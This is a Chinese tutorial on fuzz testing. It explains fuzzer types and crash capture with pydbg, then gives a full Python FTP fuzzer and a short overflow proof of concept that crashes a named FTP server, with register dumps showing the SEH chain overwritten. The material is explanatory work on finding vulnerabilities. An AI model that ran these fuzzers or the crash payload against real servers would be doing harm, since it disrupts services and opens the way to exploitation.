@@ -1,0 +1,523 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">提起模糊测试时我们在说什么</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">pr0mise</a> <span class="bull">·</span> <time title="2016/05/13 11:29" ui-time="" datetime="2016/05/13 11:29" class="published ng-binding ng-isolate-scope">2016/05/13 11:29</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 基础知识</h1><hr><h3>一:区分</h3><p>我们常说的漏洞挖掘,大致可以分为两种模式:白盒、黑盒.</p><p>1.白盒,又称透明盒测试,指我们清楚的了解程序的逻辑,获得设计思路,说明文档,源代码的情况下进行的测试.</p><p>优点:准确率高,定位到可能存在的漏洞位置处,能清楚的看到前后逻辑.<br>缺点:过于复杂,在代码量巨大的情况下,手工寻找要付出相当的精力,网传winNt4.0泄露过源码,但并未出现因该次泄露而导致的漏洞.</p><p>2.黑盒,又称功能测试,指在完全不了解内部信息的情况下进行碰撞测试</p><p>优点:可用性、重现性高,完全针对功能的测试,不同于白盒,在源码中实现漏洞函数细节但并未调用的情况,编译器会优化掉这个函数,也就是这个功能并不可用.<br>缺点:高误报,捕捉异常麻烦</p><h3>二:fuzz的局限性</h3><p>我们根据自己的经验编写相应的规则,白盒时,例如搜索gets、strcpy、fgets、memcpy等函数,然后向上回溯,如上所说,有可能函数并未调用过,亦或在上层调用之前已经做了限制,例如:</p><pre><code>#!c
+#include &lt;string.h&gt;
+void test(char *arr){
+    char buffer[10];
+    strcpy(buffer,arr);
+}
+
+int main(int argc,char **argv){
+    if(length(argv[1])&lt;=10)
+        test(argv[1]);
+}
+</code></pre><p>在黑盒时,例如出现越权漏洞、作者自留后门、多阶漏洞,我们手工测试可以精准的判断,换成程序的视角,这就是一个正常的功能,造成误报</p><h1>0x01 fuzz的各阶段</h1><hr><ol><li>确定目标</li><li>细化规则确定发包数据</li><li>发包</li><li>异常捕获</li><li>hook api定位poc</li></ol><h3>一:模糊测试器的类型</h3><p>常见的有命令行参数fuzz、环境变量fuzz、文件fuzz、网络协议fuzz、内存fuzz等</p><p>命令行参数就是上面的代码例子,环境变量fuzz,这个就是getenv("aaa"); 两种思路,不停的重写aaa变量的值和重启目标程序,第二点是必须的,第一点的改进思路hook getenv,重新实现一个getenv函数.</p><p>文件fuzz:覆盖性的写入数据,如果不读文件格式的说明文档,按字节覆盖,工作量巨大,有些文件格式会进行CRC效验,例如png文件格式.就像溢出保护的/gs选项.</p><p>网络协议fuzz:协议即传输数据的标准,数据本质上是01,根据协议对每个位置的划分来确定不同位置数据的意义,我们把这些位置称为块,块内的数据以key:value的方式存储,像是堆块中块首一样,有特定的位置标注数据的大小,client按协议格式发包后,server端根据协议解析,假如随意修改了数据却没有修改块大小,server端就无法正确识别数据.</p><p>协议也分两种:简单文本协议、二进制协议</p><p>简单协议通讯的数据在可打印字符范围内,人工可阅读,例如ftp、http协议</p><pre><code>#!bash
+[<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="a2d0cdcdd6e2dacbdbc3ccc5">[email&#160;protected]</a> ~]# nc www.xxx.com 80
+GET / HTTP/1.1
+Host: xxx.com
+Referrer: google.com
+User-Agent: wooyun
+
+HTTP/1.1 200 OK
+...
+</code></pre><p>复杂如tcp/ip协议的NBNS,wireshark本身支持的协议比较多,或是本身公开或是逆向工程,将数据解析成肉眼可阅读的格式.</p><p><img alt="test" img-src="e5e34d89046627b172f0d896d5eb69023ef83ac4.jpg"></p><p>当面对复杂且闭源的协议,对其fuzz首要工作就是逆向工程,为此出现了内存形式的fuzz,直接在程序的内存空间里进行模糊测试</p><p><img alt="test" img-src="7354a081362f09e4e30544a69f950c3ce12a0d6e.jpg"></p><p>有如上代码,无限循环接受请求,在内存空间定位到parse之前插入数据而不必关心数据在recv之前是如何封装的,缺陷就是漏洞场景可能无法重现</p><h3>二:细化规则和发包</h3><p>除去内存fuzz,发包方式分两种:直接发送跟代理发送.第二种也叫启发式fuzz,wireshark可解析的情况下,针对特定字段fuzz</p><p>流程图如下:</p><p><img alt="test" img-src="0ecca395c8ad45af354d42b7d5350626e54ff2f7.jpg"></p><p>本文以简单协议的ftp fuzz为例,瓶颈出现在发包过程中,要考虑server端的带宽和上游isp的响应速度,好在可以把server部署在本地.</p><p>以覆盖缓冲区为目的,截取不同长度的数据来发包,数据内容不能出现在用户层的内存地址,</p><p>我们喜闻乐见的栈溢出发生时会抛出内存地址读取或写入违例的异常,假如eip指向用户层内的地址可能不会抛出异常.</p><p>这里我们就用一串A来测试.</p><h3>三:异常捕获</h3><p>设想我们有一个长度为10的数组,数组内每组数据长度不同,以递增方式存储,假设第4组数据长度刚好溢出缓冲区抛出异常,模糊测试器没有异常捕获功能,直到发包完毕后才停止,那么我们只能确定测试目标存在漏洞,如何精准定位数据长度呢?</p><p>常见的捕获方式有三种:</p><ol><li>监视事件日志.</li><li>心跳包检测.</li><li>调试器</li></ol><p>大多数情况我们推荐用成熟的调试器(例如OD)attach目标程序,程序崩溃时能清楚的观察上下文,堆栈回溯定位漏洞位置,配合wireshark能清楚的看到发包数据,或者在模糊测试器内嵌异常捕获功能:</p><ol><li>CreateProcessA包含Debug_PROCESS标志来创建调试态的程序,WaitForDebugEvent获取信号,程序触发异常会发送信号给模糊测试器</li><li>DebugActiveProcess附加到相应进程上,同WaitForDebugEvent,再另外起线程去发包</li></ol><p>DEBUG_EVENT结构:</p><pre><code>#!c
+typedef struct _DEBUG_EVENT {
+  DWORD dwDebugEventCode;
+  DWORD dwProcessId;
+  DWORD dwThreadId;
+  union {
+    EXCEPTION_DEBUG_INFO Exception;
+    CREATE_THREAD_DEBUG_INFO CreateThread;
+    CREATE_PROCESS_DEBUG_INFO CreateProcessInfo;
+    EXIT_THREAD_DEBUG_INFO ExitThread;
+    EXIT_PROCESS_DEBUG_INFO ExitProcess;
+    LOAD_DLL_DEBUG_INFO LoadDll;
+    UNLOAD_DLL_DEBUG_INFO UnloadDll;
+    OUTPUT_DEBUG_STRING_INFO DebugString;
+    RIP_INFO RipInfo;
+  } u;
+} DEBUG_EVENT, 
+ *LPDEBUG_EVENT;
+</code></pre><p>dwDebugEventCode值信息</p><pre><code>#!bash
+1 u.Exception
+2 u.Create Thread
+3 u.CreateProcessInfo
+4 u.ExitThread
+5 u.ExitProcess
+6 u.LoadDll
+7 u.UnloadDll
+8 u.DebugString
+9 u.RipInfo
+</code></pre><p>无限循环,WaitForDebugEvent每隔100毫秒获取一次调试信号,捕捉到异常信号并处理完毕后,ContinueDebugEvent允许线程继续执行.ContinueDebugEvent DBG&#95;CONTINUE将控制权还给进程,DBG&#95;EXCEPTION&#95;NOT&#95;HANDLED相反</p><p>看起来实现了一个不优雅的回调</p><pre><code>#!c
+//some code
+void OnException(const EXCEPTION_DEBUG_INFO*);
+BOOL waitEvent = TRUE;
+DEBUG_EVENT debugEvent;
+while (waitEvent == TRUE &amp;&amp; WaitForDebugEvent(&amp;debugEvent, 100)) {
+
+    switch (debugEvent.dwDebugEventCode) {
+        case EXCEPTION_DEBUG_EVENT:
+            OnException(&amp;debugEvent.u.Exception);
+            break;
+
+        default:
+            std::wcout &lt;&lt; TEXT("Unknown debug event.") &lt;&lt; std::endl;
+            break;
+        }
+    if (waitEvent == TRUE) {
+        ContinueDebugEvent(debugEvent.dwProcessId, debugEvent.dwThreadId, DBG_CONTINUE);
+    }
+    else {
+        break;
+    }
+}
+//some code
+</code></pre><p>每种调试事件的具体信息用u来索引,例如dwDebugEventCode值为1,那么就是u.Exception,EXCEPTION&#95;DEBUG&#95;INFO结构中dwFirstChange用来判断首轮异常还是末轮异常,dwFirstChange不为零,代表首轮,这意味着触发异常时程序中的异常处理器还未接管.</p><p>如下代码,假如此处strcpy发生溢出,但忽略了首轮异常,except进行了处理,我们的调试器就无法捕捉</p><pre><code>#!c
+void test(){
+    __try{
+        strcpy(aaa,bbb);
+    }
+    __except(...){
+        printf(...);
+    }
+}
+</code></pre><p>之后还有获取上下文动作、读取内存动作、栈展开等,毫无疑问要花费相当的精力,幸运的pydbg模块已经帮封装了大多数的功能.</p><p>pydbg的安装网上有教程,我这里用python2.7.8 32bit正常安装</p><p><code>python -m pydoc pydbg</code>或者<code>help(pydbg)</code>查看相关介绍.</p><p><img alt="test" img-src="c55b06b0de3e7b4a48a593e107509d38733b08fc.jpg"></p><p>测试软件用的光刃前辈之前挖掘的"守望迷你ftp服务器"漏洞,测试exp:</p><pre><code>#!python
+import sys,socket
+
+def main():
+    ip,port,user,password=sys.argv[1:]
+    shellcodeTest=['A'*500]
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    connect=s.connect((ip,int(port)))
+    s.recv(4096)
+    s.send('USER'+' '+str(user)+'\r\n')
+    s.recv(4096)
+    s.send('PASS'+' '+str(password)+'\r\n')
+    s.recv(4096)
+    s.send('APPE'+' '+shellcodeTest[0]+'\r\n')
+    s.recv(4096)
+    s.send('QUIT'+' '+'\r\n')
+    s.close()
+
+if __name__ == '__main__':
+    main()
+</code></pre><p>先捕捉异常试一下,test code:</p><pre><code>#!python
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+from pydbg import *
+from pydbg.defines import *
+import utils
+import sys
+
+def accessViolationCallback(debugger):
+    if debugger.dbg.u.Exception.dwFirstChance:
+
+        print debugger.disasm(debugger.context.Eip)
+        #debugger.terminate_process()
+        return DBG_EXCEPTION_NOT_HANDLED
+        #if DBG_EXCEPTION_NOT_HANDLED then seh-&gt;veh-&gt;kill
+
+
+def main():
+    debugger=pydbg()
+    flag=0
+    targetProgramName=u'守望迷你ftp服务器.exe'
+
+    #enumerate process.filter target ftp program
+    for (pid, name ) in debugger.enumerate_processes():
+        if name ==targetProgramName.encode('gbk') :
+            # name.encode('gbk')... windows font format.. you know...
+            debugger.attach(pid)
+            flag=1
+            print "[*] attaching to program with pid %d " %pid
+
+    if flag==0:
+        print "[*] target program not found\n"
+        sys.exit(-1)
+    debugger.set_callback(EXCEPTION_ACCESS_VIOLATION, accessViolationCallback)
+    #raise EXCEPTION_ACCESS_VIOLATION,Callback "accessViolationCallback" func
+    debugger.run()
+
+
+if __name__ == '__main__':
+    main()
+</code></pre><p>看效果:</p><p><img alt="test" img-src="9a603582a23f0a497bb45f4525b421d57418bcce.jpg"></p><p>上面的utils模块的功能就是记录当前线程的状态,包括异常类型、上下文、异常地址、栈展开、seh链等</p><p>捕捉首轮异常的第一个异常(下一个异常覆盖eip,现在已经覆盖了seh chain),创建一个实例后,record&#95;crash打印线程状态概要信息,terminate&#95;process结束进程</p><pre><code>#!python
+def crashInfo(debugger):
+    crash_bin = utils.crash_binning.crash_binning()
+    crash_bin.record_crash(debugger)
+    return crash_bin.crash_synopsis()
+
+
+def accessViolationCallback(debugger):
+    if debugger.dbg.u.Exception.dwFirstChance:
+
+        print debugger.disasm(debugger.context.Eip)
+        print crashInfo(debugger)
+        debugger.terminate_process()
+        return DBG_EXCEPTION_NOT_HANDLED
+        #if DBG_EXCEPTION_NOT_HANDLED then seh-&gt;veh-&gt;kill
+</code></pre><p>查看效果</p><pre><code>#!bash
+[*] attaching to program with pid 476
+mov [edi],edx
+msvcrt.dll:77c12131 mov [edi],edx from thread 1708 caused access violati
+when attempting to write to 0x00130000
+
+CONTEXT DUMP
+  EIP: 77c12131 mov [edi],edx
+  EAX: 7efefefe (2130640638) -&gt; N/A
+  EBX: 00000000 (         0) -&gt; N/A
+  ECX: 0012fe0c (   1244684) -&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (stack)
+  EDX: 41414141 (1094795585) -&gt; N/A
+  EDI: 0012ffff (   1245183) -&gt; Actx L| 4d[IY-2(0pSsHd,,ZZ (stack)
+  ESI: 030e88b8 (  51284152) -&gt; C:/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (heap)
+  EBP: 0012dbf8 (   1235960) -&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (stack)
+  ESP: 0012d7e8 (   1234920) -&gt; RAhfC:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAA (stack)
+  +00: 00000000 (         0) -&gt; N/A
+  +04: 00410952 (   4262226) -&gt; uEuuPVr;uEu^^EuPuuV;Et&amp;9_ u!hQuuVujW3;t}
+'+=HiujW3Et1u}VW!VhQjVuS)VsE$Eu (守望迷你ftp服务器.exe.data)
+  +08: 0012d9f8 (   1235448) -&gt; AAAC:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (stack)
+  +0c: 0012d804 (   1234948) -&gt; C:\AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (stack)
+  +10: 00de6668 (  14575208) -&gt; fgh_uasortTH_GREGOR`TTbR=CRG9^ATRRhfaOPg
+TH_GREGOR`TTbRWCR (heap)
+  +14: 00000000 (         0) -&gt; N/A
+
+disasm around:
+        0x77c1211b jz 0x77c12136
+        0x77c1211d mov dl,[ecx]
+        0x77c1211f inc ecx
+        0x77c12120 test dl,dl
+        0x77c12122 jz 0x77c12188
+        0x77c12124 mov [edi],dl
+        0x77c12126 inc edi
+        0x77c12127 test ecx,0x3
+        0x77c1212d jnz 0x77c1211d
+        0x77c1212f jmp 0x77c12136
+        0x77c12131 mov [edi],edx
+        0x77c12133 add edi,0x4
+        0x77c12136 mov edx,0x7efefeff
+        0x77c1213b mov eax,[ecx]
+        0x77c1213d add edx,eax
+        0x77c1213f xor eax,0xffffffff
+        0x77c12142 xor eax,edx
+        0x77c12144 mov edx,[ecx]
+        0x77c12146 add ecx,0x4
+        0x77c12149 test eax,0x81010100
+        0x77c1214e jz 0x77c12131
+
+SEH unwind:
+        41414141 -&gt; [INVALID]:41414141 Unable to disassemble at 41414141
+        ffffffff -&gt; [INVALID]:ffffffff Unable to disassemble at ffffffff
+</code></pre><h3>四:hook api实现数据包打印</h3><p>首先查看是用的哪个dll的导出函数</p><p><img alt="test" img-src="f0185f6f736a60fe9d5c4f02123f388b63f4e628.jpg"></p><p>这里可以看到用了ws2_32和wsock32,hook wsock32 recv</p><p><img alt="test" img-src="a3559c5580ac144120f0587f17230b0e7897cdd1.jpg"></p><p>0x71A42E9E位置调用了ws2&#95;32的WSARecv函数,bp ws2&#95;32.WSARecv</p><p><img alt="test" img-src="724aa28bdb448d74cb3c80c21e114d3b64b60bc7.jpg"></p><p>查看数据包结尾标志,这里是'\x0D',读内存代码大致如下:</p><pre><code>#!python
+buffer=''
+while 1:
+    byte = dbg.read_process_memory( aaa + offset, 1 )
+    if byte != '\x0D':
+        buffer  += byte
+        offset  += 1
+        continue
+    else:
+        break
+print buffer
+</code></pre><p>看WSARecv的结构</p><pre><code>#!c
+int WSARecv(
+  _In_    SOCKET                             s,
+  _Inout_ LPWSABUF                           lpBuffers,
+  _In_    DWORD                              dwBufferCount,
+  _Out_   LPDWORD                            lpNumberOfBytesRecvd,
+  _Inout_ LPDWORD                            lpFlags,
+  _In_    LPWSAOVERLAPPED                    lpOverlapped,
+  _In_    LPWSAOVERLAPPED_COMPLETION_ROUTINE lpCompletionRoutine
+);
+</code></pre><p>断在WSARecv上</p><p><img alt="test" img-src="218ae97684c62b8f4729543707b2fa9089ace03f.jpg"></p><p>lpOverlapped is null,那么就是说为阻塞式,可以直接hook</p><p>跟踪recv</p><p><img alt="test" img-src="bccbcaae3b9db9588b259e50306b7585ee21139c.jpg"></p><p>在recv结束后ebx的值为BUFFER,缓冲区的数据会写入BUFFER指向的位置,所以在该api结束时callback即可</p><p>func&#95;resolve&#95;debug获得地址,创建一个container容器,源码上有example:</p><p><img alt="test" img-src="42e81e8bec78e8da925e858ea8d9c1b34fad6e1f.jpg"></p><p>hook参数格式:hook.add(pydbg实例,要钩住的api,地址,接受的参数数量,调用时的callback,结束时的callback)</p><p>发包USER 1 PASS 1 APPE AAAAA效果如下:</p><p><img alt="test" img-src="7a3fa3fbc5447cf9751b4cbf17ad8f48d45946db.jpg"></p><p>现在加上发包行为,当程序溢出时,最后一个打印出来的包就是poc了</p><p>发500长度数据包,hook recv,打印最后poc,然后覆盖缓冲区,触发异常,看效果:</p><p><img alt="test" img-src="4dec2a0f11996dca563f7a49d20204eadfb56ded.jpg"></p><p>现在需要做的就是在程序内内嵌一个发包动作了</p><h3>五:发包</h3><p>这里要注意win下多线程socket recv的问题,假如非阻塞的情况,接受不到数据就会触发异常.</p><p>可能是由于多线程的原因,读内存时偶尔会触发bug,想来是A线程读内存时B线程在相同的位置进行写入动作,本来嘛,python多线程就不是同步的,加上ReadProcessMemory和WriteProcessMemory应该有锁,我又给每个线程加上了休眠动作,感觉应该可以了,结果gg... 最后在读内存语句加上了互斥锁才得以解决.</p><p>重要的地方都注释了,完整的代码:</p><pre><code>#!python
+#!/usr/bin/env python
+# -*- coding:utf-8 -*-
+try:
+    from pydbg import *
+    from pydbg.defines import *
+    import utils
+except:
+    print 'pydbg or utils install error'
+from ctypes import *
+import sys
+import random
+import socket
+import getopt
+import Queue
+import threading
+import time
+
+gLock=threading.Lock()
+#global mutex lock
+
+def crashInfo(debugger):
+    crash_bin = utils.crash_binning.crash_binning()
+    crash_bin.record_crash(debugger)
+    return crash_bin.crash_synopsis()
+
+
+def accessViolationCallback(debugger):
+    if debugger.dbg.u.Exception.dwFirstChance:
+
+        print debugger.disasm(debugger.context.Eip)
+        print crashInfo(debugger)
+        debugger.terminate_process()
+        return DBG_EXCEPTION_NOT_HANDLED
+        #if DBG_EXCEPTION_NOT_HANDLED then seh-&gt;veh-&gt;kill
+
+
+def loadDllCallback(debugger):
+    global hooks,flag
+    if flag:
+        hookAddress=debugger.func_resolve_debuggee('ws2_32.dll','WSARecv')
+        #getModuleHandleA -&gt; getProcAddress -&gt; closeHandle
+
+        if hookAddress:
+            hooks.add(debugger,hookAddress,4,exit_hook=readProcessMemory)
+            print '[*] hook ws2_32.dll revc 0x%08x success\n' % hookAddress
+            flag=0
+    return DBG_CONTINUE
+
+def readProcessMemory(debugger,args,ret):
+    #time.sleep(random.uniform(0,0.05))
+    try:
+        print '[*] recving...\n'
+        buffer  = ""
+        offset  = 0
+        ebxAddress=debugger.context.Ebx
+        #the recv after get ebx address
+
+        while 1:
+            gLock.acquire()
+            #threading read memory + write memory can error,so use mutex
+            byte = debugger.read_process_memory( ebxAddress + offset, 1 )
+            gLock.release()
+
+            if byte!='\x0D':
+                buffer  += byte
+                offset  += 1
+                continue
+            else:
+                break
+    except:
+        pass
+    print buffer
+    return DBG_CONTINUE
+
+def initialiationThread(ip,user,password,port):
+
+    fuzzCommand=['LIST','APPE','RAW','RSET','XPWD','ALLO',
+        'CWD','ACCT','CDUP','DELE','HELP','MKD','MODE','NLST',
+        'NOOP','PASV','PORT','PWD','XRMD','RETR','RMD','RNFR',
+        'RNTO','SITE','SMNT','STOR','STRU','SYST','TYPE','AUTH',
+        'HOST','LANG','MDTM','OPTS','SIZE CHMOD','SIZE CHOWN','SIZE EXEC',
+        'SITE INDEX','SIZE PSWD','SIZE ZONE','SIZE WHO','XCUP','XCWD']
+    queue=Queue.Queue()
+    [queue.put(i) for i in fuzzCommand]
+
+
+    threadList=[]
+    for i in xrange(0,20):
+        t=threading.Thread(target=multiThread,args=(queue,ip,user,password,port,))
+        threadList.append(t)
+    for i in threadList:
+        i.start()
+    for i in threadList:
+        i.join(random.uniform(0,0.03))
+
+
+def multiThread(queue,ip,user,password,port):
+    #time.sleep(random.uniform(1,3))
+    time.sleep(10)
+    #sleep 10s ,control -&gt; main,else recv raise except
+
+    bufferString=['A'*25*(i+1) for i in xrange(30)]
+    try:
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        connect=s.connect((ip,int(port)))
+        print 'ccccccccc'
+        s.recv(1024)
+
+
+        while not queue.empty():
+            #if queue is null, not while conditional,then GIL pause.
+            ftpCommand=queue.get(block=False)
+            for i in bufferString:
+                s.send('USER'+' '+str(user)+'\r\n')
+                s.recv(1024)
+                s.send('PASS'+' '+str(password)+'\r\n')
+                s.recv(1024)
+                s.send(ftpCommand+' '+i+'\r\n')
+                s.recv(1024)
+
+
+
+    except socket.error,Queue.Empty:
+        #queue.queue.clear()
+        print 'ftp didn\'t response'
+    except Exception,e:
+        print e
+    finally:
+        s.close()
+        #because other thread may not spark except,so finally s.close()
+
+def getArgv():
+    try:
+        options,args = getopt.getopt(sys.argv[1:],'hi:u:p:P:',['help','ip=','user=','pass=','port='])
+        if len(options)==0:
+            raise Exception
+    except Exception,e:
+        usage()
+
+    for name,value in options:
+        if name in ('-h','--help'):
+            usage()
+        if name in ('-i','--ip'):
+            ip=value
+        if name in ('-u','--user'):
+            user=value
+        if name in ('-p','--pass'):
+            password=value
+        if name in ('-P','--port'):
+            port=value
+    initialiationThread(ip,user,password,port)
+
+
+def usage():
+
+    print '[*] python fuzz.py -i 127.0.0.1 -u test -p test -P 21'
+    print '[*] python fuzz.py --ip 127.0.0.1 --user test --pass test --port 21'
+    print '[*] thanks bstaint'
+    print '[*] author pr0mise'
+    sys.exit(-1)
+
+def main():
+    getArgv()
+
+    print '\n'
+    debugger=pydbg()
+    targetProgramName=u'守望迷你ftp服务器.exe'
+    global hooks,flag
+    flag=0
+    hooks = utils.hook_container()
+
+
+    #enumerate process.filter target ftp program
+    for (pid, name ) in debugger.enumerate_processes():
+        if name ==targetProgramName.encode('gbk') :
+            # name.encode('gbk')... windows font format.. you know...
+            debugger.attach(pid)
+            flag=1
+            print '[*] attaching to program with pid %d ' %pid
+
+    if flag==0:
+        print '[*] target program not found\n'
+        sys.exit(-1)
+    debugger.set_callback(EXCEPTION_ACCESS_VIOLATION, accessViolationCallback)
+    #raise EXCEPTION_ACCESS_VIOLATION,Callback "accessViolationCallback" func
+
+    debugger.set_callback(LOAD_DLL_DEBUG_EVENT, loadDllCallback)
+    #the LoadLibrary('dll') after callback loadDllCallback func
+
+    debugger.run()
+
+
+
+if __name__ == '__main__':
+    main()
+</code></pre><p>执行:</p><pre><code>#!bash
+RETR mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmm
+mov [edi],edx
+msvcrt.dll:77c12131 mov [edi],edx from thread 692 caused access violation
+when attempting to write to 0x00130000
+
+CONTEXT DUMP
+  EIP: 77c12131 mov [edi],edx
+  EAX: 7efefefe (2130640638) -&gt; N/A
+  EBX: 00000000 (         0) -&gt; N/A
+  ECX: 0012fe0c (   1244684) -&gt; mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmC:\mm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (stack)
+  EDX: 6d6d6d6d (1835887981) -&gt; N/A
+  EDI: 0012ffff (   1245183) -&gt; Actx L| 4d[IY-2(0pSsHd,,ZZ (stack)
+  ESI: 030f4cf8 (  51334392) -&gt; C:/mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (heap)
+  EBP: 0012decc (   1236684) -&gt; mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (stack)
+  ESP: 0012dabc (   1235644) -&gt; RAhfC:\mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmm (stack)
+  +00: 00000000 (         0) -&gt; N/A
+  +04: 00410952 (   4262226) -&gt; uEuuPVr;uEu^^EuPuuV;Et&amp;9_ u!hQuuVujW3;t}EwEuPEP
+'+=HiujW3Et1u}VW!VhQjVuS)VsE$Eu (守望迷你ftp服务器.exe.data)
+  +08: 0012dccc (   1236172) -&gt; mmmC:\mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (stack)
+  +0c: 0012dad8 (   1235672) -&gt; C:\mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm
+mmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm (stack)
+  +10: 00de6668 (  14575208) -&gt; fgh_uasortTH_GREGOR`TTbR=CRG9^ATRRhfaOPggfuksor
+TH_GREGOR`TTbRWCR (heap)
